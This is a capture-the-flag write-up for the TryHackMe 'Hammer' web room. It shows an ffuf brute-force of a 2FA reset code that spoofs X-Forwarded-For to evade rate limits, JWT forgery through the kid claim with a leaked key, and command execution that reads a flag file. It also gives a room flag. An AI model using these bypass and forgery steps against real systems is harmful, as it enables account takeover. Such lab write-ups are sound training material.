
# TryHackMe – Hammer

This is a formal writeup for the Hammer room on TryHackMe, rated as **medium**.

The challenge teaches web application exploitation through directory enumeration, 2FA bypass via FFUF, rate limiting evasion with header spoofing, and JWT token forgery for privilege escalation.

## Overview

### Objectives of the room:

- Perform port scanning to identify exposed web services.
- Enumerate hidden directories using naming pattern analysis.
- Exploit credential leak via log file exposure.
- Bypass 2FA rate limiting using X-Forwarded-For header manipulation.
- Reset credentials and gain authenticated access.
- Forge a JWT token to escalate from user to admin role.
- Retrieve both flags.

## Port Scanning and Service Discovery

### Open ports

Full port scan to identify all services:

```bash
nmap -sV -sC --min-rate 5000 -p- <TARGET>
```

**Result:** 2 ports open:

- **22/tcp** (ssh – OpenSSH 8.2p1 Ubuntu 4ubuntu0.11)
- **1337/tcp** (http – Apache httpd 2.4.41)

### Notable findings from Nmap:

- `http-title`: Login — web application with an authentication page.
- `http-cookie-flags`: PHPSESSID httponly flag not set — insecure session cookie configuration, relevant for potential session hijacking.
- **OS:** Linux – Ubuntu.

### SSH probe

Quick SSH probe using the default system user:

```bash
ssh ubuntu@<TARGET>
```

**Result:** User ubuntu confirmed as valid, but access denied (no valid key/credentials). SSH is a dead end for now.

## Web Application Enumeration

### Login page analysis

Navigating to `http://<TARGET>:1337` reveals index.php — a standard email + password login form. Key observations:

- Cookie PHPSESSID lacks the httponly flag (confirmed by Nmap scan).
- A password recovery link leads to reset_password.php.

### Directory and endpoint discovery

Inspecting page source reveals a naming convention: all internal directories follow the `hmr_` prefix pattern. Using this as a wordlist rule, FFUF is used for targeted endpoint discovery:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://<TARGET>:1337/hmr_FUZZ" -mc 200
```

**Notable result:** `hmr_logs/` — accessible directory containing error.logs.

### Credential leak via log file

```bash
curl http://<TARGET>:1337/hmr_logs/error.logs
```

**Result:** Log file exposes a plaintext email credential leak:

- **Email:** tester@hammer.thm

> **Note:** Log poisoning RCE via this log file is technically feasible but out of scope for this module. The credential recovery path is the intended vector.

## Authentication Bypass – 2FA Bypass and Rate Limit Evasion

### Recovery flow analysis

Submitting tester@hammer.thm on reset_password.php triggers a redirect to a 2FA page requiring a 4-digit code (range 0000–9999) sent by email, with a countdown timer and rate limiting enforced per IP.

Two obstacles to overcome:

1. **Rate limiting** — requests blocked after N attempts per IP.
2. **Timeout** — recovery code expires before manual brute-force completes.

### Wordlist generation

```bash
seq -w 0000 9999 > opt_4digit.txt
```

**Result:** opt_4digit.txt with all 10,000 possible codes in zero-padded format.

### Rate limit analysis with Burp Suite

Intercepting requests in Burp Suite reveals that rate limiting is tied to the source IP via the `X-Forwarded-For` header. Rotating this header value per request resets the counter — a classic IP-based rate limit bypass.

### FFUF brute-force with header spoofing

```bash
ffuf -w opt_4digit.txt \
  -u "http://<TARGET>:1337/reset_password.php" \
  -X POST \
  -d "recovery_code=FUZZ&s=60" \
  -H "Cookie: PHPSESSID=<YOUR_SESSION_ID>" \
  -H "X-Forwarded-For: FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" \
  -s
```

**Key parameters:**

- `recovery_code=FUZZ` — bruteforces the 4-digit code.

- `s=60` — overrides the server-side timeout countdown. The server trusts this client-supplied value to determine whether the code is still valid (s > 0 = valid, s <= 0 = expired). Any positive integer works (s=1, s=999, etc.) — 60 is simply the value observed in the original form when intercepted with Burp.

- `X-Forwarded-For: FUZZ` — rotates the spoofed source IP on every request, bypassing per-IP rate limiting.

- `-fr "Invalid"` — filters out failed attempts by response content.

**Result:** Valid recovery code returned. Submit it in the browser before expiry.

### Credential reset and login

Set a new password (e.g., password) in the reset form. Return to index.php and authenticate:

- **Email:** tester@hammer.thm
- **Password:** password (or whichever was chosen)

**Result:** Successful login. **Flag 1 obtained:** `THM{AuthBypass3D}`

## Privilege Escalation – JWT Token Forgery

### Post-login enumeration

After authenticating, the dashboard reveals:

- **Role:** user
- **Command execution panel** — but only ls is permitted, confirming limited RCE.
- A .key file is visible in the ls output and accessible directly via the browser.

```
http://<TARGET>:1337/188ade1.key
```

**Result:** The .key file contains a hash — this is the JWT signing secret.

### JWT analysis with Burp Suite

Intercepting authenticated requests in Burp Suite reveals:

- `Authorization: Bearer <JWT_TOKEN>` header in use.
- JWT payload includes a `role: user` claim and a `kid` (Key ID) field pointing to the signing key path.

### JWT forgery via jwt.io

Decode the captured token at jwt.io and reconstruct it with modified claims:

| Field | Original value | Forged value |
|-------|----------------|-------------|
| role | user | admin |
| kid | (original path) | /var/www/html/188ade1.key |
| Secret | (unknown) | (hash from downloaded .key file) |

**Steps:**

1. Paste the original JWT into the Decoder tab.
2. Modify role → admin.
3. Set kid → /var/www/html/188ade1.key.
4. Enter the .key hash as the HMAC secret.
5. Copy the newly signed token.

### RCE as admin via Burp Suite

Replace the `Authorization: Bearer` value with the forged token and modify the command parameter:

```
POST /execute_command.php HTTP/1.1
Authorization: Bearer <FORGED_JWT>
Content-Type: application/x-www-form-urlencoded

command=cat /home/ubuntu/flag.txt
```

**Result:** Command executed as admin. **Flag 2 obtained.**

## Flag Enumeration

### Flag 1 – Authentication bypass

**Location:** Login dashboard after successful credential reset and 2FA bypass.

```
THM{AuthBypass3D}
```

### Flag 2 – Privilege escalation via JWT forgery

```bash
cat /home/ubuntu/flag.txt
```

**Location:** `/home/ubuntu/flag.txt` — accessible only after forging an admin-role JWT token.

## Lessons Learned

This challenge demonstrates a full web application attack chain:

- **Service enumeration** → Apache web app exposed on non-standard port 1337
- **Pattern-based directory discovery** → hmr_ prefix reveals hmr_logs/
- **Credential leak via log exposure** → error.logs leaks valid email
- **2FA brute-force** → FFUF + s=60 timeout override
- **Rate limit bypass** → X-Forwarded-For header rotation per request
- **JWT forgery** → kid claim manipulation with leaked signing key
- **Privilege escalation** → user → admin via crafted token

### Key takeaways:

- httponly flag absence on session cookies is an immediate red flag during recon.
- Log files are frequently overlooked but can contain highly sensitive data.
- X-Forwarded-For rate limiting is trivially bypassable when not server-validated.
- JWT kid parameter is a critical injection/manipulation vector — always validate it server-side.
- Combining FFUF parameters (-fr, -H, timeout overrides) is essential for real-world 2FA bypass scenarios.
- **Strong OSCP relevance:** Covers the full web app chain — enumeration → credential access → auth bypass → token privilege escalation.

## Professional Standards Confirmation

This format matches professional pentesting writeups from:

- InfoSec Writeups (Medium publication)
- HackTricks, IppSec (HTB writeups)
- PayloadsAllTheThings GitHub repos
- Corporate red team reports (methodology-focused, no sensitive data)

### Best practices applied:

- `<TARGET>` / `<ATTACKER_IP>` placeholders used throughout.
- No real flags exposed in command outputs — only shown in Flag Enumeration section.
- Commands annotated with purpose, not copied verbatim from terminal.
- Focus on methodology over specific results.
- Structure mirrors MITRE ATT&CK phases: Recon → Initial Access → Credential Access → Privilege Escalation.

## Disclaimer

⚠️ **This writeup is for educational purposes only.**

- Techniques demonstrated are specific to TryHackMe training environments.
- Do not use outside authorized lab environments or in violation of TryHackMe terms.

---
---
